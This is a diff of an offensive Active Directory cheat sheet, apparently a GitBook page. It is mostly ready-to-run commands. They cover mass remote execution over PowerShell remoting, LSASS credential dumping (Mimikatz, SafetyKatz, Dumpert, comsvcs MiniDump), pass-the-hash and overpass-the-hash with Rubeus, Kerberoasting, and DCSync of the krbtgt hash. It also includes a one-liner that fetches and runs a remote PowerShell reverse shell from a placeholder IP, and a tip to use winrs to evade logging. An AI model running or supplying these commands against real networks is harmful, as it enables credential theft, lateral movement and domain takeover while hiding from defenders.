@@ -26,78 +26,104 @@ ls \\\\\[hostname]\c$
 **Connect to machine with administrator privs**\
 ****Enter-PSSession -Computername
 
-**Save and use sessions of a machine**\
-****$sess = New-PSSession -Computername hostname.local\
+**1-1 Save and use sessions of a machine**
+
+```powershell
+$sess = New-PSSession -Computername hostname.local
+$sess = New-PSSession -Computername hostname.local -credential
 Enter-PSSession $sess
 
-No local file be included in Enter-PSSession/New-PSSession
 
-**Execute commands on a machine(s) (non-interactive)**
+No local file be included in Enter-PSSession/New-PSSession
+```
+
+**1-n Execute commands on a machine(s) (non-interactive)**
 
 {% code overflow="wrap" %}
 ```powershell
 Invoke-Command -Computername hostname -Scriptblock {whoami;hostname}
+❗Invoke-Command -Scriptblock {hostname;whoami} -Computername (Get-Content ad_computers.txt)
 Invoke-Command -Computername hostname -Scriptblock {$executioncontext.sessionstate.languagemode}
 Invoke-Command -Scriptblock {whoami} -Computername (Get-Content <list-of-servers-file>) 
 ```
 {% endcode %}
 
-**Execute script on a machine**
+**1-n Execute script on a machine**
 
 {% code overflow="wrap" %}
 ```powershell
-Invoke-Command -Computername (Get-Content <list-of-servers-file>) -FilePath  C:\scripty\a.ps1
+Invoke-Command -FilePath  C:\scripty\a.ps1 -Computername (Get-Content <list-of-servers-file>) 
 ❗Invoke-Command -FilePath C:\scripty\a.ps1 -Session $sess
    Enter-PSSession -Session $sess
-   functionname_in_aps1
+   functionname_in_a.ps1
 ```
 {% endcode %}
 
 
 
-**Execute locally loaded function on a list of remote machines**
+**1-n Execute locally loaded function on a list of remote machines**
 
-{% code overflow="wrap" %}
-```powershell
-Invoke-Command -Scriptblock ${function:test} -Computername (Get-Content <list_of_servers>)
-❗Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content <list_of_servers>)
-A file/function test.ps1 is creatd and . .\test.ps1 With the content
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-Command -Scriptblock ${function:test} -Computername (Get-Content &#x3C;list_of_servers>)
+
+<strong>❗Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -Computername (Get-Content &#x3C;list_of_servers>)
+</strong>A file/function test.ps1 is creatd and . .\test.ps1 With the content
 function test
 {
  Write-Output "Test" 
 }
-```
-{% endcode %}
+</code></pre>
 
 then run "test"  => Then we can run Invoke-Command -Scriptblock ${function:test} -Computername a\_host
 
-**Execute locally loaded function on a list of remote machines & passing arguemnts (only positional arguments could be passed)**\
-****
+**1-n Execute locally loaded function on a list of remote machines & passing arguemnts (only positional arguments could be passed)**
 
-{% code overflow="wrap" %}
-```powershell
-Invoke-Command -ScriptBlock ${fucntion:getPassHashes} -Hostname a_host -ArgumentList
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Invoke-Command -ScriptBlock ${fucntion:GetPassHashes} -Hostname a_host -ArgumentList
 
-Use "Stateful" command using Invoke-Command:
-$sess = New-PSSession -computername host1
+<strong>Use "Stateful" command using Invoke-Command:
+</strong>$sess = New-PSSession -computername host1
 Invoke-Command -session $sess -ScriptBlock {$Proc = Get-Process}
 Invoke-Command -session $sess -ScriptBlock {$Proc.Name}
-```
-{% endcode %}
+</code></pre>
 
-**Copy script to other server**
+**1-1 Copy script to other server**
 
 ```powershell
 Copy-Item .\Invoke-MimikatzEx.ps1 \\hostname\c$\'Program Files'
 ```
 
-**Powershell reverse shell**
+**1-1 Powershell reverse shell**
 
 {% code overflow="wrap" %}
 ```powershell
 powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000
 ```
 {% endcode %}
+
+## Extracint Credentials from LSASS
+
+<pre class="language-powershell"><code class="lang-powershell">**Mimikatz**
+Invoke-Mimikatz -command '"sekurlsa::ekeys"'
+
+**SafetyKatz** minidump oflsass and PELoader to run Mimikatz
+safetykatz.exe "sekurlsa::ekeys"    
+<strong>
+</strong><strong>**SharpKatz** - C# port of some Mimikatz functionalitities
+</strong>sharpkatz.exe --command ekeys
+
+**Dumpert** (Direct System Calls and API unhookking)
+rundll32.exe C:\Dumpert\Outflank-dumpert.dll,Dump
+
+**PyPyKatz*
+pypykatz.exe live lsa
+
+**comsvcs.dll**
+tasklist /FI "IMAGENAME eq lsass.exe"
+runddl32.exe C:\windows\system32\comsvcs.dll, MiniDump &#x3C;lsass pid> C:\Users\Public\lsass.dmp full
+
+**From Linux**
+Impacket
+Physmem2profit
+</code></pre>
 
 ## Mimikatz - Invoke-Mimikatz
 
@@ -109,8 +135,10 @@ powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicPar
 
 {% code overflow="wrap" %}
 ```powershell
+Invoke-Mimikatz -command '"sekurlsa::ekeys"'
+
 Invoke-Mimikatz -DumpCreds   //default parameter
-Invoke-Mimikatz -DumpCreds -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
+❗Invoke-Mimikatz -DumpCreds -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
 ```
 {% endcode %}
 
@@ -123,6 +151,14 @@ Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:dom.local /
 {% endcode %}
 
 Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.
+
+**Use winrs of PSRemoting to evade the logging**\
+****winrs -r:hostname cmd\
+****winrs -r:hostname -u:server\usernmae -p:password-of-user command-to-run\
+\
+Other Remoting\
+Use winrm.vbs and/or COM objects of WSMan object https://github.com/bohops/WSMan-WinRM \
+
 
 ## **🍳Kerberoasting**
 
@@ -167,15 +203,34 @@ Invoke-Mimikatz -Command '"kerberos::list /export"'
 
 ### Attack commands
 
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Needs Admin rights:
+Invoke-Mimikatz '"sekurlsa::pth /user:Administrator /domain:target.domain.local &#x3C; /ntlm:hash | /aes256:hash> /run:powershell.exe'"
+
+Safetykatz.exe "sekurlsa::pth /user:administrator /domain:dom.local /aes256:hash /run:powershell.exe" "exit"
+
+=> Generates powershell session with logon type type 9 same as runas /netonly
+<strong>
+</strong><strong>-------------
+</strong>No Admin rights needed
+<strong>Rubeus.exe asktgt /user:USER &#x3C;/rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/opsec] /ptt
+</strong><strong>
+</strong><strong>Needs admin rights:
+</strong><strong>Rubeus.exe asktgt /user:administrator /aes256:hash /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+</strong>
+
+</code></pre>
+
+## 🔁DCSync
+
+**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**
+
 {% code overflow="wrap" %}
 ```powershell
-Rubeus.exe asktgt /user:USER < /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/opsec] /ptt
+Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'
 
-Invoke-Mimikatz '"sekurlsa::pth /user:Administrator /domain:target.domain.local < /ntlm:hash | /aes256:hash> /run:powershell.exe'"
+SafetyKatz.exe "lsadump::dcsync /user:dom\krbtgt" "exit"
 ```
 {% endcode %}
-
-
 
 
 
